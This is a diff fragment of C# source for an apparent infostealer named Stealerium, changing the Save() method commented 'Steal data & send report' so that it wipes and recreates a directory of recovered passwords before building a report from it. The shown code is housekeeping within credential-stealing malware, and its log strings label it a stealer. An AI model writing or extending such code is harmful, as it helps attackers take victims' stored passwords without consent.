@@ -15,18 +15,18 @@ namespace Stealerium.Target
         // Steal data & send report
         public static string Save()
         {
-            Console.WriteLine("Running passwords recovery...");
+            
+            try
+            {
+                Logging.Log("Removing Old Data>> Started!\n");
+                Filemanager.RecursiveDelete(PasswordsStoreDirectory);
+                Logging.Log("Removing Old Data>> Ended!\n");
+            }
+            catch
+            {
+                Logging.Log("Stealer >> Failed recursive remove directory with passwords");
+            }
             if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
-            else
-                try
-                {
-                    Filemanager.RecursiveDelete(PasswordsStoreDirectory);
-                }
-                catch
-                {
-                    Logging.Log("Stealer >> Failed recursive remove directory with passwords");
-                }
-
             return Report.CreateReport(PasswordsStoreDirectory) ? PasswordsStoreDirectory : "";
         }
     }
